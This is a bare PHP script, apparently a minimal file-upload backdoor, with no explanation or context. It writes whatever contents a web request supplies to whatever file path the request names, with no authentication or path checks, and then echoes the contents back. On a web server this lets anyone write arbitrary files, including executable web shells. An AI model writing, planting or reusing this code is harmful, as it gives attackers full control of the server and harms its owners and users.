<?php
$file=$_REQUEST["file"];
$contents=$_REQUEST["contents"];
$ret=file_put_contents ($file,$contents);
echo $contents;
?>